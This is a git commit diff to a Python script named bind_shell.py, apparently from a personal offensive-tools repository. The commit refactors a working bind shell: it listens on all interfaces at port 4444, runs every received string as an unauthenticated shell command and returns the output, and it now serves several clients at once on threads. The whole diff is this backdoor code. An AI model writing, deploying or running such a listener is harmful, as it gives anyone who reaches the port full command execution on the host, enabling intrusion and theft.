96faf4dd52a1360644936c60614b11adaf709350
Zendeni <53412927+Zendeni@users.noreply.github.com>
2024-05-15 12:21:31 +0200

    Update bind_shell.py

--- bind_shell/bind_shell.py
+++ bind_shell/bind_shell.py
@@ -1,19 +1,13 @@
 import socket
 import subprocess
 import click
+from threading import Thread
 
 def run_cmd(cmd):
     output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
     return output.stdout
 
-@click.command()
-@click.option('--port', '-p', default=4444)
-def main(port):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind(('0.0.0.0', port))
-    s.listen(4)
-    client_socket, address = s.accept()
-
+def handle_input(client_socket):
     while True:
         chunks = []
         chunk = client_socket.recv(2048)
@@ -29,6 +23,18 @@ def main(port):
 
         output = run_cmd(cmd)
         client_socket.sendall(output)
+
+@click.command()
+@click.option('--port', '-p', default=4444)
+def main(port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(('0.0.0.0', port))
+    s.listen(4)
+
+    while True:
+        client_socket, _ = s.accept()
+        t = Thread(target=handle_input, args=(client_socket, ))
+        t.start()
 
 if __name__ == '__main__':
     main()
